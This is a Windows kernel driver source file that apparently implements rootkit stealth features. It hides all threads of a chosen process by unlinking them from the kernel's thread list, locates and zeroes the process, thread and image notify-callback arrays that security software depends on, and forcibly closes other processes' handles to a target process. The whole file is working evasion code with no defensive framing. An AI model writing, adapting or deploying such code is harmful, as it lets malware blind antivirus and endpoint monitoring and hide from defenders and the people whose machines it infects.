#include "stealth.h"
#include <ntddk.h>

/* Undocumented APIs — not declared in WDK headers */
NTKERNELAPI PETHREAD PsGetNextProcessThread(
	IN PEPROCESS Process,
	IN PETHREAD  Thread
);

NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN  ULONG  SystemInformationClass,
	OUT PVOID  SystemInformation,
	IN  ULONG  SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

/* -----------------------------------------------------------------------
 * Thread hiding — unlink ETHREAD entries from EPROCESS.ThreadListHead
 * ----------------------------------------------------------------------- */

/*
 * FindThreadListOffsets
 *
 * Dynamically locates ThreadListHead in EPROCESS and ThreadListEntry
 * in ETHREAD by finding a LIST_ENTRY in the EPROCESS whose Flink
 * points into the first thread's ETHREAD structure.
 */
static NTSTATUS FindThreadListOffsets(
	IN  PEPROCESS Process,
	OUT PULONG    ThreadListHeadOffset,
	OUT PULONG    ThreadListEntryOffset
)
{
	PETHREAD  FirstThread;
	ULONG_PTR ThreadAddr;
	ULONG     Off;

	FirstThread = PsGetNextProcessThread( Process, NULL );
	if ( !FirstThread )
		return STATUS_NOT_FOUND;

	ThreadAddr = (ULONG_PTR)FirstThread;

	for ( Off = 0; Off < 0x800; Off += sizeof( ULONG_PTR ) )
	{
		PLIST_ENTRY Candidate = (PLIST_ENTRY)( (PUCHAR)Process + Off );
		ULONG_PTR   Flink = (ULONG_PTR)Candidate->Flink;

		/* Flink should point somewhere inside the ETHREAD (< 0x1000 bytes) */
		if ( Flink > ThreadAddr && Flink < ThreadAddr + 0x1000 )
		{
			PLIST_ENTRY Entry = (PLIST_ENTRY)Flink;

			/* Verify: Blink of the thread entry should point back to the head */
			if ( (ULONG_PTR)Entry->Blink == (ULONG_PTR)Candidate )
			{
				*ThreadListHeadOffset  = Off;
				*ThreadListEntryOffset = (ULONG)( Flink - ThreadAddr );
				ObDereferenceObject( FirstThread );
				return STATUS_SUCCESS;
			}
		}
	}

	ObDereferenceObject( FirstThread );
	return STATUS_NOT_FOUND;
}

NTSTATUS KmHideProcessThreads(
	IN  HANDLE ProcessId,
	OUT PULONG ThreadsHidden
)
{
	PEPROCESS   Process = NULL;
	NTSTATUS    Status;
	ULONG       HeadOffset, EntryOffset;
	PLIST_ENTRY Head, Current, Next;
	ULONG       Count = 0;

	if ( ThreadsHidden )
		*ThreadsHidden = 0;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	Status = FindThreadListOffsets( Process, &HeadOffset, &EntryOffset );
	if ( !NT_SUCCESS( Status ) )
	{
		ObDereferenceObject( Process );
		return Status;
	}

	Head = (PLIST_ENTRY)( (PUCHAR)Process + HeadOffset );
	Current = Head->Flink;

	while ( Current != Head )
	{
		Next = Current->Flink;

		/* Unlink this thread entry */
		Current->Blink->Flink = Current->Flink;
		Current->Flink->Blink = Current->Blink;
		Current->Flink = Current;
		Current->Blink = Current;

		Count++;
		Current = Next;
	}

	/* Empty the head — no threads visible */
	Head->Flink = Head;
	Head->Blink = Head;

	ObDereferenceObject( Process );

	if ( ThreadsHidden )
		*ThreadsHidden = Count;

	return STATUS_SUCCESS;
}

/* -----------------------------------------------------------------------
 * Callback enumeration and removal
 *
 * The Ps*NotifyRoutine arrays are not exported. We find them by scanning
 * the exported Ps registration functions for LEA [RIP+disp32] instructions
 * that reference the callback arrays.
 * ----------------------------------------------------------------------- */

#define MAX_NOTIFY_CALLBACKS 64

/*
 * ScanForLeaTarget
 *
 * Scans a function body for the first LEA REG, [RIP+disp32] instruction
 * and returns the effective address. On x64, the encoding is:
 *   REX.W (48/4C) + 8D + ModRM(mod=00, rm=101) + disp32
 */
static PVOID ScanForLeaTarget( PUCHAR Start, ULONG Length )
{
	ULONG i;

	for ( i = 0; i + 7 < Length; i++ )
	{
		UCHAR Rex    = Start[i];
		UCHAR Opcode = Start[i + 1];
		UCHAR ModRm  = Start[i + 2];

		if ( ( Rex == 0x48 || Rex == 0x4C ) &&
			 Opcode == 0x8D &&
			 ( ModRm & 0xC7 ) == 0x05 )
		{
			INT32 Disp = *(PINT32)( &Start[i + 3] );
			PVOID Target = (PVOID)( &Start[i + 7] + Disp );

			/* Sanity: target should be in kernel space */
			if ( (ULONG_PTR)Target > 0xFFFF800000000000ULL )
				return Target;
		}
	}

	return NULL;
}

/*
 * FindCallbackArray
 *
 * Locates the callback array for a given registration function.
 * Handles both inlined functions and stubs that JMP/CALL to internal helpers.
 */
static PVOID FindCallbackArray( PVOID FunctionAddress )
{
	PUCHAR Bytes = (PUCHAR)FunctionAddress;
	PVOID  Result;
	ULONG  i;

	/* Try the function body directly */
	Result = ScanForLeaTarget( Bytes, 0x300 );
	if ( Result )
		return Result;

	/* Follow a near JMP (E9) or CALL (E8) if the function is a stub */
	for ( i = 0; i < 0x20; i++ )
	{
		if ( Bytes[i] == 0xE9 || Bytes[i] == 0xE8 )
		{
			INT32  Offset = *(PINT32)( &Bytes[i + 1] );
			PUCHAR Target = &Bytes[i + 5] + Offset;

			Result = ScanForLeaTarget( Target, 0x300 );
			if ( Result )
				return Result;
		}
	}

	return NULL;
}

/*
 * GetCallbackArrayForType
 *
 * Resolves the callback array address for process, thread, or image callbacks.
 */
static PVOID GetCallbackArrayForType( ULONG CallbackType )
{
	UNICODE_STRING FuncName;
	PVOID          FuncAddr;

	switch ( CallbackType )
	{
		case CALLBACK_TYPE_PROCESS:
			RtlInitUnicodeString( &FuncName, L"PsSetCreateProcessNotifyRoutine" );
			break;
		case CALLBACK_TYPE_THREAD:
			RtlInitUnicodeString( &FuncName, L"PsSetCreateThreadNotifyRoutine" );
			break;
		case CALLBACK_TYPE_IMAGE:
			RtlInitUnicodeString( &FuncName, L"PsSetLoadImageNotifyRoutine" );
			break;
		default:
			return NULL;
	}

	FuncAddr = MmGetSystemRoutineAddress( &FuncName );
	if ( !FuncAddr )
		return NULL;

	return FindCallbackArray( FuncAddr );
}

NTSTATUS KmEnumerateNotifyCallbacks(
	IN  ULONG           CallbackType,
	OUT PCALLBACK_ENTRY  Entries,
	IN  ULONG           MaxEntries,
	OUT PULONG           ReturnedEntries
)
{
	PVOID   Array;
	ULONG   i, Count = 0;

	if ( !Entries || !ReturnedEntries )
		return STATUS_INVALID_PARAMETER;

	*ReturnedEntries = 0;

	Array = GetCallbackArrayForType( CallbackType );
	if ( !Array )
		return STATUS_NOT_FOUND;

	for ( i = 0; i < MAX_NOTIFY_CALLBACKS && Count < MaxEntries; i++ )
	{
		ULONG64 RawEntry = ( (PULONG64)Array )[i];

		/* Clear EX_FAST_REF low bits */
		ULONG64 Block = RawEntry & ~(ULONG64)0xF;

		if ( Block != 0 )
		{
			/*
			 * EX_CALLBACK_ROUTINE_BLOCK layout:
			 *   +0x00  EX_RUNDOWN_REF RundownProtect
			 *   +0x08  PVOID          Function
			 *   +0x10  PVOID          Context
			 *
			 * The callback function pointer is at offset 0x08.
			 */
			PVOID CallbackFunc = *(PVOID*)( (PUCHAR)Block + 0x08 );

			Entries[Count].Index   = i;
			Entries[Count].Address = (ULONG64)(ULONG_PTR)CallbackFunc;
			Count++;
		}
	}

	*ReturnedEntries = Count;
	return STATUS_SUCCESS;
}

NTSTATUS KmRemoveNotifyCallback(
	IN ULONG CallbackType,
	IN ULONG Index
)
{
	PVOID Array;

	if ( Index >= MAX_NOTIFY_CALLBACKS )
		return STATUS_INVALID_PARAMETER;

	Array = GetCallbackArrayForType( CallbackType );
	if ( !Array )
		return STATUS_NOT_FOUND;

	/* Zero the entry atomically — the callback will no longer be invoked */
	InterlockedExchange64( (PLONG64)&( (PULONG64)Array )[Index], 0 );

	return STATUS_SUCCESS;
}

/* -----------------------------------------------------------------------
 * Handle stripping — close handles to a process from all other processes
 * ----------------------------------------------------------------------- */

/* Not defined in WDK headers */
#define SystemExtendedHandleInformation 64

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID     Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG     GrantedAccess;
	USHORT    CreatorBackTraceIndex;
	USHORT    ObjectTypeIndex;
	ULONG     HandleAttributes;
	ULONG     Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

NTSTATUS KmStripProcessHandles(
	IN  HANDLE ProcessId,
	OUT PULONG HandlesStripped
)
{
	PEPROCESS  TargetProcess = NULL;
	NTSTATUS   Status;
	PVOID      Buffer = NULL;
	ULONG      BufferSize = 0x40000; /* 256 KB initial */
	ULONG      ReturnLength = 0;
	ULONG      Stripped = 0;
	ULONG_PTR  i;
	HANDLE     CallerPid;
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo;

	if ( HandlesStripped )
		*HandlesStripped = 0;

	Status = PsLookupProcessByProcessId( ProcessId, &TargetProcess );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	CallerPid = PsGetCurrentProcessId();

	/* Query system handle table — grow buffer until it fits */
	while ( TRUE )
	{
		Buffer = ExAllocatePoolWithTag( PagedPool, BufferSize, 'hSmK' );
		if ( !Buffer )
		{
			ObDereferenceObject( TargetProcess );
			return STATUS_INSUFFICIENT_RESOURCES;
		}

		Status = ZwQuerySystemInformation(
			SystemExtendedHandleInformation,
			Buffer,
			BufferSize,
			&ReturnLength
		);

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			ExFreePoolWithTag( Buffer, 'hSmK' );
			BufferSize = ReturnLength + 0x10000;
			continue;
		}

		break;
	}

	if ( !NT_SUCCESS( Status ) )
	{
		ExFreePoolWithTag( Buffer, 'hSmK' );
		ObDereferenceObject( TargetProcess );
		return Status;
	}

	HandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)Buffer;

	for ( i = 0; i < HandleInfo->NumberOfHandles; i++ )
	{
		PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Entry = &HandleInfo->Handles[i];
		HANDLE OwnerPid;

		/* Check if this handle references our target process object */
		if ( Entry->Object != (PVOID)TargetProcess )
			continue;

		OwnerPid = (HANDLE)Entry->UniqueProcessId;

		/* Skip our own process and the System process */
		if ( OwnerPid == CallerPid || OwnerPid == (HANDLE)4 )
			continue;

		/* Attach to the owning process and close the handle */
		{
			PEPROCESS  OwnerProcess = NULL;
			KAPC_STATE ApcState;

			Status = PsLookupProcessByProcessId( OwnerPid, &OwnerProcess );
			if ( !NT_SUCCESS( Status ) )
				continue;

			KeStackAttachProcess( OwnerProcess, &ApcState );

			/*
			 * ZwClose operates on the current process's handle table.
			 * Since we're attached to the owner, this closes their handle.
			 * Ignore errors (handle may be protected or already closed).
			 */
			ZwClose( (HANDLE)Entry->HandleValue );

			KeUnstackDetachProcess( &ApcState );
			ObDereferenceObject( OwnerProcess );

			Stripped++;
		}
	}

	ExFreePoolWithTag( Buffer, 'hSmK' );
	ObDereferenceObject( TargetProcess );

	if ( HandlesStripped )
		*HandlesStripped = Stripped;

	return STATUS_SUCCESS;
}
